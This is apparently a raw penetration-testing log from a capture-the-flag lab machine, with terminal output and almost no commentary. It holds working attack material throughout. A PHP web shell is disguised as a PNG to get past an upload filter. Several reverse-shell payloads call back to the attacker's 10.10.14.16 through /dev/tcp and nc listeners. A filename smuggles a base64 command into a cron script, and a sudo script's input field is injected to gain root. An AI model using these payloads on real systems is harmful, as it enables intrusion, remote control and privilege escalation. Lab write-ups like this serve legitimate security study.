@@ -1,0 +1,217 @@
+┌──(kali㉿kali)-[~]
+└─$ feroxbuster -u http://10.10.10.146 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt,html --filter-status 404
+                                                                                                                    
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.10.146
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+ 💢  Status Code Filters   │ [404]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, txt, html]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        7l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        8l       22w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET        8l       40w      229c http://10.10.10.146/
+301      GET        7l       20w      235c http://10.10.10.146/backup => http://10.10.10.146/backup/
+200      GET      201l      582w    10240c http://10.10.10.146/backup/backup.tar
+200      GET        8l       40w      229c http://10.10.10.146/index.php
+200      GET        0l        0w        0c http://10.10.10.146/lib.php
+200      GET       17l       98w     7046c http://10.10.10.146/uploads/127_0_0_2.png
+200      GET       17l       98w     7046c http://10.10.10.146/uploads/127_0_0_3.png
+200      GET       17l       98w     7046c http://10.10.10.146/uploads/127_0_0_1.png
+200      GET       17l       98w     7046c http://10.10.10.146/uploads/127_0_0_4.png
+200      GET       22l       88w     1302c http://10.10.10.146/photos.php
+200      GET        1l        1w        2c http://10.10.10.146/uploads/
+301      GET        7l       20w      236c http://10.10.10.146/uploads => http://10.10.10.146/uploads/
+200      GET        5l       13w      169c http://10.10.10.146/upload.php
+200      GET        1l        1w        2c http://10.10.10.146/uploads/index.html
+[####################] - 26s    57016/57016   0s      found:14      errors:0      
+[####################] - 18s    18988/18988   1074/s  http://10.10.10.146/ 
+[####################] - 0s     18988/18988   58425/s http://10.10.10.146/backup/ => Directory listing (add --scan-dir-listings to scan)
+[####################] - 15s    18988/18988   1279/s  http://10.10.10.146/cgi-bin/ 
+[####################] - 14s    18988/18988   1385/s  http://10.10.10.146/uploads/                                                                                                                                                      
+┌──(kali㉿kali)-[~]
+└─$ 
+
+http://10.10.10.146/photos.php
+but even better
+http://10.10.10.146/upload.php
+
+
+printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A<?php system($_GET["cmd"]); ?>' > shell.php.png
+
+http://10.10.10.146/uploads/10_10_14_16.php.png?cmd=id
+
+�PNG  uid=48(apache) gid=48(apache) groups=48(apache) 
+
+http://10.10.10.146/uploads/10_10_14_16.php.png?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.16/4444%200%3E%261%27
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444     
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.146] 44154
+bash: no job control in this shell
+bash-4.2$ 
+
+bash-4.2$ cd home
+cd home
+bash-4.2$ ls -la
+ls -la
+total 8
+drwxr-xr-x.  3 root root   18 Jul  2  2019 .
+drwxr-xr-x. 17 root root 4096 Sep  7  2022 ..
+drwxr-xr-x.  2 guly guly 4096 Sep  6  2022 guly
+bash-4.2$ cd guly
+cd guly
+bash-4.2$ ls -la
+ls -la
+total 28
+drwxr-xr-x. 2 guly guly 4096 Sep  6  2022 .
+drwxr-xr-x. 3 root root   18 Jul  2  2019 ..
+lrwxrwxrwx. 1 root root    9 Sep  7  2022 .bash_history -> /dev/null
+-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout
+-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile
+-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc
+-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
+-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly
+-r--------. 1 guly guly   33 Aug 16 08:03 user.txt
+bash-4.2$ cat check_attack.php
+cat check_attack.php
+<?php
+require '/var/www/html/lib.php';
+$path = '/var/www/html/uploads/';
+$logpath = '/tmp/attack.log';
+$to = 'guly';
+$msg= '';
+$headers = "X-Mailer: check_attack.php\r\n";
+
+$files = array();
+$files = preg_grep('/^([^.])/', scandir($path));
+
+foreach ($files as $key => $value) {
+        $msg='';
+  if ($value == 'index.html') {
+        continue;
+  }
+  #echo "-------------\n";
+
+  #print "check: $value\n";
+  list ($name,$ext) = getnameCheck($value);
+  $check = check_ip($name,$value);
+
+  if (!($check[0])) {
+    echo "attack!\n";
+    # todo: attach file
+    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);
+
+    exec("rm -f $logpath");
+    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+    echo "rm -f $path$value\n";
+    mail($to, $msg, $msg, $headers, "-F$value");
+  }
+}
+
+?>
+bash-4.2$ cat crontab.guly
+cat crontab.guly
+*/3 * * * * php /home/guly/check_attack.php
+bash-4.2$ 
+
+
+bash-4.2$ cd /var/www/html/uploads
+cd /var/www/html/uploads
+bash-4.2$ touch -- ';echo YmFzaCAtYyAiYmFzaCAtaSA+L2Rldi90Y3AvMTAuMTAuMTQuMTYvNTU1NSAwPiYxIg== | base64 -d | bash'
+<ldi90Y3AvMTAuMTAuMTQuMTYvNTU1NSAwPiYxIg== | base64 -d | bash'               
+bash-4.2$ 
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 5555     
+listening on [any] 5555 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.146] 44324
+python -c "import pty;pty.spawn('/bin/bash')"
+[guly@networked ~]$ ls -la
+ls -la
+total 28
+drwxr-xr-x. 2 guly guly 4096 Sep  6  2022 .
+drwxr-xr-x. 3 root root   18 Jul  2  2019 ..
+lrwxrwxrwx. 1 root root    9 Sep  7  2022 .bash_history -> /dev/null
+-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout
+-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile
+-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc
+-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
+-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly
+-r--------. 1 guly guly   33 Aug 16 08:03 user.txt
+[guly@networked ~]$ cat user.txt
+
+
+[guly@networked ~]$ sudo -l
+sudo -l
+Matching Defaults entries for guly on networked:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User guly may run the following commands on networked:
+    (root) NOPASSWD: /usr/local/sbin/changename.sh
+[guly@networked ~]$ 
+[guly@networked ~]$ cat /usr/local/sbin/changename.sh
+cat /usr/local/sbin/changename.sh
+#!/bin/bash -p
+cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+EoF
+
+regexp="^[a-zA-Z0-9_\ /-]+$"
+
+for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
+        echo "interface $var:"
+        read x
+        while [[ ! $x =~ $regexp ]]; do
+                echo "wrong input, try again"
+                echo "interface $var:"
+                read x
+        done
+        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+done
+  
+/sbin/ifup guly0
+[guly@networked ~]$ 
+
+[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
+sudo /usr/local/sbin/changename.sh
+interface NAME:
+abc /bin/bash
+abc /bin/bash
+interface PROXY_METHOD:
+abc
+abc
+interface BROWSER_ONLY:
+abc
+abc
+interface BOOTPROTO:
+abc
+abc
+[root@networked network-scripts]# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+
